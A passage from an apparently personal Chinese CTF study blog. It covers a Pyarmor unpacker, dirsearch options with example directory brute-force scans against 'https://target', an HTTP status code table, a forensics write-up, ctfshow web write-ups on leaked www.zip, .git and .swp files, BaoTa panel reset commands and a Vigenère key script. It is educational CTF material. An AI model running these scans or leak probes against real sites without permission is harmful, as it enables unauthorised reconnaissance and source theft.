path/to/pyarmor_runtime[.pyd|.so|.dylib] 来指定一个 pyarmor_runtime 可执行文件。</p><p>所有由此工具生成的文件在其文件名中都包含 .1shot.。如果您想将它们保存到另一个目录而不是原地保存，请使用 -o another/path/。文件夹结构将保持不变。</p><p>注意：</p><ul><li><p>如果文件夹名称恰好是 <strong>pycache</strong> 或 site-packages，或者它直接包含一个名为 .no1shot 的文件，则其子目录将不会被处理，并且符号链接不会被跟踪，以避免重复或无限循环并节省时间。如果您确实需要处理它们，请稍后在这些目录中运行脚本并指定运行时。</p></li><li><p>由 PyInstaller 等生成的归档文件、可执行文件等，必须在使用其他工具解包后再进行解密，否则您可能会遇到未定义的行为。</p></li></ul><h3 id="反馈"><a class="header-anchor" href="#反馈">¶</a>反馈</h3><p>如果您有任何疑问、建议或问题，请随时提出 issue。如果可能，请不要忘记附上受保护的数据和 pyarmor_runtime 可执行文件。</p><h3 id="待办事项（欢迎提交-PR！）"><a class="header-anchor" href="#待办事项（欢迎提交-PR！）">¶</a>待办事项（欢迎提交 PR！）</h3><p>多平台 pyarmor_runtime 可执行文件支持</p><p>支持更多混淆选项</p><p>为其他后端重新生成 pyc</p><p>文档（不接受关于此部分的 PR）</p><h3 id="致-CTF-挑战赛出题人"><a class="header-anchor" href="#致-CTF-挑战赛出题人">¶</a>致 CTF 挑战赛出题人</h3><p>请不要制作那些关于寻找和使用现有工具的 CTF（夺旗赛）逆向挑战。这对任何人都没有乐趣。这更像是一场捉迷藏游戏，而不是对技能和创造力的考验。</p><p>理解 Pyarmor 或此工具的工作原理，并尝试改进它们，会更有意义。</p><p>Star 趋势图<br><a href="https://starchart.cc/Lil-House/Pyarmor-Static-Unpack-1shot.svg?variant=adaptive">https://starchart.cc/Lil-House/Pyarmor-Static-Unpack-1shot.svg?variant=adaptive</a></p><h1>具体使用方法</h1><ul><li>payload</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python E:\app-down\ctf工具箱\ctf工具箱\pyarmor-1shot-v0<span class="number">.2</span><span class="number">.1</span>-windows-x86_64\oneshot\shot.py (待解密文件位置)</span><br></pre></td></tr></table></figure><ul><li>解密后的文件应该会生成在相同目录下，文件名会包含 .1shot. 标识，例如：<ul><li><a href="http://start.1shot.dis.py">start.1shot.dis.py</a> (反汇编结果)</li><li><a href="http://start.1shot.py">start.1shot.py</a> (反编译的源代码)</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch使用方法</title>
      <link href="/2025/10/21/dirsearch%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2025/10/21/dirsearch%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="选项"><a class="header-anchor" href="#选项">¶</a>选项:</h3><p>–version 显示程序的版本号并退出</p><p>-h, --help 显示此帮助消息并退出</p><p>必需：</p><p>-u URL, --url=URL 目标URL，可以使用多个选项指定多个目标URL</p><p>-l PATH, --urls-file=PATH</p><p>URL列表文件</p><p>–stdin 从标准输入读取URL</p><p>–cidr=CIDR 目标CIDR</p><p>–raw=PATH 从文件加载原始HTTP请求（使用’–scheme’标志设置方案）</p><p>-s SESSION_FILE, --session=SESSION_FILE</p><p>会话文件</p><p>–config=PATH 配置文件路径（默认为’DIRSEARCH_CONFIG’环境变量，否则为’config.ini’）</p><p>字典设置:</p><p>-w WORDLISTS, --wordlists=WORDLISTS</p><p>单词列表文件或包含单词列表文件的目录（以逗号分隔）</p><p>-e EXTENSIONS, --extensions=EXTENSIONS</p><p>扩展名列表，以逗号分隔（例如：php,asp）</p><p>-f, --force-extensions</p><p>在每个单词列表条目的末尾添加扩展名。默认情况下，dirsearch只替换%EXT%关键字为扩展名。</p><p>-O, --overwrite-extensions</p><p>使用指定的扩展名覆盖单词列表中的其他扩展名（通过’-e’选择）</p><p>–exclude-extensions=EXTENSIONS</p><p>排除的扩展名列表，以逗号分隔（例如：asp,jsp）</p><p>–remove-extensions 删除所有路径中的扩展名（例如：admin.php -&gt; admin）</p><p>–prefixes=PREFIXES 将自定义前缀添加到所有单词列表条目中（以逗号分隔）</p><p>–suffixes=SUFFIXES 将自定义后缀添加到所有单词列表条目中，忽略目录（以逗号分隔）</p><p>-U, --uppercase 单词列表转为大写</p><p>-L, --lowercase 单词列表转为小写</p><p>-C, --capital 单词首字母大写</p><p>通用设置:</p><p>-t THREADS, --threads=THREADS</p><p>线程数</p><p>-r, --recursive 递归地进行强制破解</p><p>–deep-recursive 在每个目录深度上执行递归扫描（例如：api/users -&gt; api/）</p><p>–force-recursive 对找到的每个路径执行递归强制破解，而不仅仅是目录</p><p>-R DEPTH, --max-recursion-depth=DEPTH</p><p>最大递归深度</p><p>–recursion-status=CODES</p><p>用于执行递归扫描的有效状态码，支持范围（以逗号分隔）</p><p>–subdirs=SUBDIRS 扫描给定URL的子目录（以逗号分隔）</p><p>–exclude-subdirs=SUBDIRS</p><p>在递归扫描期间排除以下子目录（以逗号分隔）</p><p>-i CODES, --include-status=CODES</p><p>包括的状态码，以逗号分隔，支持范围（例如：200,300-399）</p><p>-x CODES, --exclude-status=CODES</p><p>排除的状态码，以逗号分隔，支持范围（例如：301,500-599）</p><p>–exclude-sizes=SIZES</p><p>根据大小排除响应，以逗号分隔（例如：0B,4KB）</p><p>–exclude-text=TEXTS 根据文本排除响应，可以使用多个标志</p><p>–exclude-regex=REGEX</p><p>根据正则表达式排除响应</p><p>–exclude-redirect=STRING</p><p>如果此正则表达式（或文本）与重定向URL匹配，则排除响应（例如：‘/index.html’）</p><p>–exclude-response=PATH</p><p>排除类似于此页面响应的响应，路径作为输入（例如：404.html）</p><p>–skip-on-status=CODES</p><p>每当命中这些状态码之一时跳过目标，以逗号分隔，支持范围</p><p>–min-response-size=LENGTH</p><p>响应的最小长度</p><p>–max-response-size=LENGTH</p><p>响应的最大长度</p><p>–max-time=SECONDS 扫描的最大运行时间</p><p>–exit-on-error 发生错误时退出</p><p>请求设置:</p><p>-m METHOD, --http-method=METHOD</p><p>HTTP请求方法（默认为GET）</p><p>-d DATA, --data=DATA HTTP请求数据</p><p>–data-file=PATH 包含HTTP请求数据的文件</p><p>-H HEADERS, --header=HEADERS</p><p>HTTP请求标头，可以使用多个标志</p><p>–headers-file=PATH 包含HTTP请求标头的文件</p><p>-F, --follow-redirects</p><p>跟随HTTP重定向</p><p>–random-agent 每个请求选择一个随机User-Agent</p><p>–auth=CREDENTIAL 认证凭据（例如：user:password或bearer token）</p><p>–auth-type=TYPE 认证类型（basic、digest、bearer、ntlm、jwt）</p><p>–cert-file=PATH 包含客户端证书的文件</p><p>–key-file=PATH 包含客户端证书私钥的文件（未加密）</p><p>–user-agent=USER_AGENT</p><p>–cookie=COOKIE</p><p>连接设置:</p><p>–timeout=TIMEOUT 连接超时时间</p><p>–delay=DELAY 请求之间的延迟</p><p>-p PROXY, --proxy=PROXY</p><p>代理URL（HTTP/SOCKS），可以使用多个标志</p><p>–proxies-file=PATH 包含代理服务器的文件</p><p>–proxy-auth=CREDENTIAL</p><p>代理认证凭据</p><p>–replay-proxy=PROXY 用于重放已发现路径的代理</p><p>–tor 使用Tor网络作为代理</p><p>–scheme=SCHEME 原始请求的协议或URL中没有协议时使用的协议（默认为自动检测）</p><p>–max-rate=RATE 每秒请求数最大值</p><p>–retries=RETRIES 失败请求的重试次数</p><p>–ip=IP 服务器IP地址</p><p>高级设置:</p><p>–crawl 在响应中爬取新路径</p><p>显示设置:</p><p>–full-url 在输出中显示完整URL（在静默模式下自动启用）</p><p>–redirects-history 显示重定向历史记录</p><p>–no-color 不使用彩色输出</p><p>-q, --quiet-mode 安静模式</p><p>输出设置:</p><p>-o PATH/URL, --output=PATH/URL</p><p>输出文件或MySQL/PostgreSQL数据库URL（格式：</p><p>scheme://[username:password@]host[:port]/database-</p><p>name）</p><p>–format=FORMAT 报告格式（可用：simple、plain、json、xml、md、csv、html、</p><p>sqlite、mysql、postgresql）</p><p>–log=PATH 日志文件</p><h3 id="payload"><a class="header-anchor" href="#payload">¶</a>payload</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target     //简单的查看网址目录和文件</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //使用文件拓展名为php,txt,zip的字典扫描目标url</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R <span class="number">2</span></span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R <span class="number">4</span> --scan-subdirs=/,/wp-content/,/wp-admin/</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --random-agents</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --json-report=reports/target.json</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --simple-report=reports/target-paths.txt</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --plain-text-report=reports/target-paths-and-status.js</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>http状态码</title>
      <link href="/2025/10/21/http%E7%8A%B6%E6%80%81%E7%A0%81/"/>
      <url>/2025/10/21/http%E7%8A%B6%E6%80%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>状态码</th><th>英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议，只能切换到更高级的协议</td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于 GET 与 POST 请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Info</td><td>非授权信息。请求成功，但返回的 meta 信息不在原始服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端应重置文档视图</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分 GET 请求</td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久移动到新 URI</td></tr><tr><td>302</td><td>Found</td><td>临时移动。资源只是临时被移动，客户端应继续使用原有 URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。使用 GET 和 POST 请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器不会返回任何资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的 HTTP 状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与 302 类似，使用 GET 请求重定向</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求，但拒绝执行</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据请求找到资源</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Auth Required</td><td>请求要求代理的身份认证</td></tr><tr><td>408</td><td>Request Timeout</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理不带 Content-Length 的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>请求的实体过大，服务器无法处理</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的 URI 过长，服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested Range Not Satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足请求头中 Expect 字段指定的预期行为</td></tr><tr><td>418</td><td>I’m a teapot</td><td>状态码 418 是一个愚人节玩笑，定义于 RFC 2324</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或代理的服务器从远程服务器接收到无效响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>服务器暂时无法处理请求，可能因超载或系统维护</td></tr><tr><td>504</td><td>Gateway Timeout</td><td>充当网关或代理的服务器未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version Not Supported</td><td>服务器不支持请求的 HTTP 协议版本</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024美亚杯个人资格赛wp</title>
      <link href="/2025/10/20/2024%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%A0%BC%E8%B5%9Bwp/"/>
      <url>/2025/10/20/2024%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%A0%BC%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<ul><li>由于学校网络太烂，平航杯检材误删。。开始先看网上的2024美亚杯个人资格赛wp，先行梳理思路</li></ul><h3 id="题目："><a class="header-anchor" href="#题目：">¶</a>题目：</h3><p><img src="/img/2024%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%A0%BC%E8%B5%9Bwp_image.png" alt="alt text"></p><h3 id="1-单选题-Emma已经几天没有收到她姐姐Clara的消息了，报警失踪，她焦虑地将手机提交给警察，希望能找到线索。警察将手机交给你进行电子数据取证。你成功提取了Emma手机的镜像。请根据取证结果回答以下问题。根据Emma-Mobile-zip，Emma和Clara的微信聊天记录，Emma最后到警署报案并拍摄写有报案编号的卡片，拍摄时的经纬值是多少？-2分"><a class="header-anchor" href="#1-单选题-Emma已经几天没有收到她姐姐Clara的消息了，报警失踪，她焦虑地将手机提交给警察，希望能找到线索。警察将手机交给你进行电子数据取证。你成功提取了Emma手机的镜像。请根据取证结果回答以下问题。根据Emma-Mobile-zip，Emma和Clara的微信聊天记录，Emma最后到警署报案并拍摄写有报案编号的卡片，拍摄时的经纬值是多少？-2分">¶</a>1. [单选题] Emma已经几天没有收到她姐姐Clara的消息了，报警失踪，她焦虑地将手机提交给警察，希望能找到线索。警察将手机交给你进行电子数据取证。你成功提取了Emma手机的镜像。请根据取证结果回答以下问题。根据Emma_Mobile.zip，Emma和Clara的微信聊天记录，Emma最后到警署报案并拍摄写有报案编号的卡片，拍摄时的经纬值是多少？(2分)</h3><p>A. 22.451721666667, 114.171853333333<br>B. 22.451553333333, 114.172845<br>C. 22.451928333333, 114.170503333333<br>D. 22.451638333333, 114.16993</p><ul><li>图片经纬度<ul><li>法一：exiftool查看器：便利使用方法是把图片拖到exe文件上打开，此题信息没藏里面但有学习价值；已知是苹果手机，所以我们应该去手机数据库中找到原有格式的手机相关内容，翻到数据库中的最后标签为19的heic文件时间和之前我们找到的.pic文件时间相同 所以这张照片应该是传输前发送的原图然后翻看到别的表中，就可以找到这个图片的坐标信息</li><li>法二：在Emma的图库里面找到了这张图片，在message_2.sqlite数据库里面找到了这张图片的具体信息，可以找到图片的UUID内容，根据UUID直接在数据库Photos.sqlite里面找到。问了一下ai，感觉UUID就像是Photos.sqlite专属的哈希值一样的东西。</li></ul></li><li>AutoPsy：虽然不如商业软件强, 但是兼容性非常强, 各种提取软件生成的奇奇怪怪的格式的文件集合, 多少都能识别出来一些。本部分题目关联的检材 Emma_Mobile.zip 是文件集合, 数据库文件(DB 目录)和 plist (plist 目录)按照文件类型归类. 本身不是镜像文件, 仅提取了部分文件系统中的文件(Active 目录), 因此将整个压缩包放入取证软件进行自动取证也会缺少很多信息.<ul><li>不会用</li></ul></li></ul><h3 id="参考："><a class="header-anchor" href="#参考：">¶</a>参考：</h3><p><a href="https://blog.csdn.net/2301_77163694/article/details/143671589">2024年美亚杯个人赛 资格赛 wp</a><br><a href="https://blog.csdn.net/2301_81210668/article/details/147111162">2024年美亚杯团体赛wp</a><br><a href="https://forensics.xidian.edu.cn/wiki/MeiyaCup2024Individual/">美亚杯2024个人赛题解</a><br><a href="https://www.cnblogs.com/zzpu213/p/18794234">2024美亚杯个人赛</a></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 美亚杯 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web合集wp</title>
      <link href="/2025/10/20/ctfshow-web%E5%90%88%E9%9B%86wp/"/>
      <url>/2025/10/20/ctfshow-web%E5%90%88%E9%9B%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h4><ul><li>使用浏览器自带的审计功能F12可以查看网站源代码.</li><li>前端的HTML（超文本标记语言）中，如果想要添加注释，需要使用<!--注释内容--> 注释标签。该标签用来在源文档中插入注释，注释不会在浏览器中显示。</li><li>在URL前可以通过添加 view-source:URL 实现绕过前端限制显示网页源码.</li></ul><h4 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h4><ul><li>JavaScript实现禁用代码审计</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁用鼠标右键</span></span><br><span class="line">window.document.oncontextmenu = function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//禁用复制</span></span><br><span class="line">window.document.onselectstart = function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//禁用F12</span></span><br><span class="line">document.onkeydown = function() &#123;</span><br><span class="line">    <span class="keyword">if</span>(window.event &amp;&amp; window.event.keyCode == <span class="number">123</span>) &#123;</span><br><span class="line">        event.keyCode = <span class="number">0</span>;</span><br><span class="line">        event.returnValue = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h4><ul><li>自带工具直接抓包<br><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_w-1.png" alt="alt text"></li></ul><h4 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h4><ul><li>提示了robot题型<br><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image.png" alt="alt text"><br><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-1.png" alt="alt text"></li></ul><h4 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h4><ul><li>phps源码泄露</li><li>PHPS 文件是 PHP 源代码文件，通常用于通过 Web 浏览器直接查看 PHP 代码内容。然而，这种文件可能导致源码泄露，带来安全隐患。</li><li><a href="/2025/10/21/http%E7%8A%B6%E6%80%81%E7%A0%81">http状态码</a><br><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-2.png" alt="alt text"><br><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-3.png" alt="alt text"></li><li>使用工具：<a href="/2025/10/21/http%E7%8A%B6%E6%80%81%E7%A0%81">dirsearch</a></li></ul><h4 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h4><ul><li>题目<ul><li>解压源码到当前目录，测试正常，收工</li><li>考察代码泄露。直接访问url/www.zip,获得flag</li></ul></li><li>知识点：网站主页源码文件名称为 www.zip ，然后再URL后添加/www.zip对网站主页源码进行下载,然后进行解压</li></ul><p><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-4.png" alt="alt text"><br><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-5.png" alt="alt text"></p><h4 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h4><ul><li>题目<ul><li>版本控制很重要，但不要部署到生产环境更重要。</li><li>考察git代码泄露，直接访问url/.git/index.php</li></ul></li><li>在Linux中.开头的文件是隐藏文件，网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露.</li></ul><h4 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h4><ul><li>题目<ul><li>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</li><li>考察vim缓存信息泄露，直接访问url/index.php.swp 注：上面的信息泄露可以参考 <a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></li></ul></li><li>去除swp后缀打开获得</li></ul><h4 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h4><ul><li>题目<ul><li>cookie 只是一块饼干，不能存放任何隐私数据</li></ul></li></ul><p><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-6.png" alt="alt text"></p><ul><li>%7B %7D {}的URL编码</li></ul><h4 id="web11【待】"><a class="header-anchor" href="#web11【待】">¶</a>web11【待】</h4><ul><li>题目<ul><li>域名其实也可以隐藏信息，<a href="http://xn--flag-f96g315g.ctfshow.com">比如flag.ctfshow.com</a> 就隐藏了一条信息</li><li>通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</li><li>查找flag.ctfshow.com域名下的txt记录</li></ul></li></ul><p><img src="/img/ctfshow-web%E5%90%88%E9%9B%86wp_image-7.png" alt="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝塔命令</title>
      <link href="/2025/10/19/%E5%AE%9D%E5%A1%94%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/10/19/%E5%AE%9D%E5%A1%94%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="忘记Linux-3-X-4-x-5-x-6-x-7-x-宝塔面板密码的解决方案"><a class="header-anchor" href="#忘记Linux-3-X-4-x-5-x-6-x-7-x-宝塔面板密码的解决方案">¶</a>忘记Linux 3.X/4.x/5.x/6.x/7.x 宝塔面板密码的解决方案</h3><ul><li>进入ssh，推荐先安装 堡塔SSH客户端 (免费/简单/中文/多屏) ，输入以下命令重置密码（把命令最后面的“testpasswd”替换成你要改的新密码）<ul><li>注：若是debian/ubuntu用户，请使用有root权限的账户去执行这条命令</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/server/panel &amp;&amp; btpython tools.py panel testpasswd</span><br></pre></td></tr></table></figure><p>紫框即你要修改的密码<br>红框即面板账户</p><ul><li>如果提示多次登录失败，暂时禁止登录 请输入以下命令 清除登录限制</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -f /www/server/panel/data/*.login</span><br></pre></td></tr></table></figure><ul><li>新装面板用户获取默认账号密码命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bt default</span><br></pre></td></tr></table></figure><ul><li>6.x及以后版本可输入<code>bt</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bilibili速成crypto视频学习笔记</title>
      <link href="/2025/10/18/%E9%80%9F%E6%88%90crypto%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/18/%E9%80%9F%E6%88%90crypto%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="工具："><a class="header-anchor" href="#工具：">¶</a>工具：</h3><ul><li>cyberchef魔法棒</li><li>轩禹RSA</li></ul><h3 id="密码："><a class="header-anchor" href="#密码：">¶</a>密码：</h3><h4 id="维吉尼亚密码计算密钥–-维吉尼亚密钥只能由字母组成"><a class="header-anchor" href="#维吉尼亚密码计算密钥–-维吉尼亚密钥只能由字母组成">¶</a>维吉尼亚密码计算密钥–&gt;维吉尼亚密钥只能由字母组成</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_vigenere_key</span>(<span class="params">plaintext, ciphertext</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据维吉尼亚密码的明文和密文推导密钥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        plaintext (str): 明文，可以包含字母、数字和其他字符</span></span><br><span class="line"><span class="string">        ciphertext (str): 密文，可以包含字母、数字和其他字符</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        str: 推导得到的密钥，大小写与明文保持一致</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 确保输入的明文和密文长度相同</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(plaintext) != <span class="built_in">len</span>(ciphertext):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;明文和密文的长度必须相同&quot;</span>)</span><br><span class="line"></span><br><span class="line">    key = []</span><br><span class="line">    <span class="comment"># 遍历每个字符对，计算对应的密钥字符</span></span><br><span class="line">    <span class="keyword">for</span> p, c <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, ciphertext):</span><br><span class="line">        <span class="comment"># 检查是否都为字母或都为非字母</span></span><br><span class="line">        <span class="keyword">if</span> p.isalpha() <span class="keyword">and</span> c.isalpha():</span><br><span class="line">            <span class="comment"># 都是字母，计算密钥</span></span><br><span class="line">            is_upper = p.isupper()  <span class="comment"># 确定大小写，与明文保持一致</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 转换为0-25的数值 (A=0, B=1, ..., Z=25)</span></span><br><span class="line">            p_val = <span class="built_in">ord</span>(p.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            c_val = <span class="built_in">ord</span>(c.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算密钥值: 密钥 = (密文 - 明文) mod 26</span></span><br><span class="line">            k_val = (c_val - p_val) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 转换回字母，并保持原大小写</span></span><br><span class="line">            key_char = <span class="built_in">chr</span>(k_val + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_upper:</span><br><span class="line">                key_char = key_char.lower()</span><br><span class="line"></span><br><span class="line">            key.append(key_char)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> p.isalpha() <span class="keyword">and</span> <span class="keyword">not</span> c.isalpha():</span><br><span class="line">            <span class="comment"># 都不是字母，密钥保持与明文一致</span></span><br><span class="line">            key.append(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 一个是字母，一个不是字母，不匹配</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;明文和密文在位置 <span class="subst">&#123;<span class="built_in">len</span>(key)&#125;</span> 处不匹配（一个是字母，一个是非字母）&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;维吉尼亚密码密钥推导工具&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取用户输入</span></span><br><span class="line">    plaintext = <span class="built_in">input</span>(<span class="string">&quot;请输入明文: &quot;</span>)</span><br><span class="line">    ciphertext = <span class="built_in">input</span>(<span class="string">&quot;请输入密文: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span 